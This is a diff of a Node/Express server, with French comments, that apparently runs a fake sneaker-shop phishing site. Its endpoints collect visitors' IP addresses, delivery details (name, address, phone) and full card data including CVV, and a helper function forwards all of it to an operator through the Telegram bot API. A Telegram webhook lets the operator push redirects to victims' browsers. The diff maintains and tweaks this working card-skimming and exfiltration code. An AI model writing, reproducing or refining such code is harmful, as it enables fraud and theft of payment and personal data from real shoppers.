@@ -1,4 +1,3 @@
-// server.js
 import express from 'express';
 import path from 'path';
 import bodyParser from 'body-parser';
@@ -21,7 +20,7 @@ const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}` : nu
 
 if(!BOT_TOKEN || !CHAT_ID) console.warn('⚠️ BOT_TOKEN ou CHAT_ID non défini.');
 
-// Sessions par IP
+// sessions par IP
 const sessions = {}; // ip -> {data:{page, pair, delivery, card}, redirect:null}
 
 // Helper: envoyer notif Telegram
@@ -29,7 +28,7 @@ async function sendTelegramNotif(data){
   if(!TELEGRAM_API || !CHAT_ID) return;
   const lines = [];
   lines.push('🆕 <b>Nouvelle interaction</b>');
-  lines.push('🌐 <b>IP:</b> '+data.ip);
+  if(data.ip) lines.push('🌐 <b>IP:</b> '+data.ip);
   if(data.page) lines.push('📄 <b>Page:</b> '+data.page);
   if(data.pair) lines.push('👟 <b>Paire choisie:</b> '+data.pair);
   if(data.delivery){
@@ -43,6 +42,7 @@ async function sendTelegramNotif(data){
     lines.push(`📅 <b>Expiry:</b> ${data.card.expiry}`);
     lines.push(`🔒 <b>CVV:</b> ${data.card.cvv}`);
   }
+
   const text = lines.join('\n');
 
   const keyboard = {
@@ -70,7 +70,7 @@ async function sendTelegramNotif(data){
   }
 }
 
-// Helper pour récupérer IPv4
+// Middleware pour IP
 function getIP(req){
   let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
   if(ip.includes(',')) ip = ip.split(',')[0];
@@ -78,21 +78,15 @@ function getIP(req){
   return ip;
 }
 
-// ---------- Endpoints ----------
-
-// Nouvelle visite (notif envoyée uniquement si première visite)
+// Endpoint visite
 app.get('/api/visit', (req,res)=>{
   const ip = getIP(req);
-  if(!sessions[ip]){
-    sessions[ip] = {data:{page:'Accueil', ip}, redirect:null};
-    sendTelegramNotif(sessions[ip].data);
-  } else {
-    sessions[ip].data.page = 'Accueil';
-  }
+  if(!sessions[ip]) sessions[ip] = {data:{page:'Accueil', ip}, redirect:null};
+  sendTelegramNotif(sessions[ip].data);
   res.json({ok:true, ip});
 });
 
-// Choix paire
+// Endpoint choix paire
 app.post('/api/pair', (req,res)=>{
   const {pair} = req.body;
   const ip = getIP(req);
@@ -103,7 +97,7 @@ app.post('/api/pair', (req,res)=>{
   res.json({ok:true});
 });
 
-// Livraison
+// Endpoint livraison
 app.post('/api/delivery', (req,res)=>{
   const {nom, prenom, adresse, telephone} = req.body;
   const ip = getIP(req);
@@ -114,7 +108,7 @@ app.post('/api/delivery', (req,res)=>{
   res.json({ok:true});
 });
 
-// Paiement
+// Endpoint paiement
 app.post('/api/payment', (req,res)=>{
   const {cardNumber, expiry, cvv, nomTitulaire} = req.body;
   const ip = getIP(req);
@@ -130,21 +124,15 @@ app.post('/api/payment', (req,res)=>{
   res.json({ok:true});
 });
 
-// Polling status pour redirection
+// Polling status pour redirection (reset après envoi)
 app.get('/api/status', (req,res)=>{
   const ip = getIP(req);
-  if(!sessions[ip]){
-    return res.json({redirect:null});
-  }
-  const redirect = sessions[ip].redirect || null;
-
-  // on renvoie l'URL puis on reset pour éviter la boucle
-  sessions[ip].redirect = null;
-
+  const redirect = sessions[ip]?.redirect || null;
+  if(sessions[ip]) sessions[ip].redirect = null; // reset pour éviter boucle
   res.json({redirect});
 });
 
-// Telegram webhook pour boutons
+// Telegram webhook
 app.post('/telegramWebhook', bodyParser.json(), async (req,res)=>{
   const body = req.body;
   if(body?.callback_query){
@@ -154,6 +142,7 @@ app.post('/telegramWebhook', bodyParser.json(), async (req,res)=>{
       sessions[ip].redirect = url;
       sessions[ip].data.page = 'Redirection admin vers '+url;
       sendTelegramNotif(sessions[ip].data);
+
       await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
         method:'POST',
         headers:{'Content-Type':'application/json'},
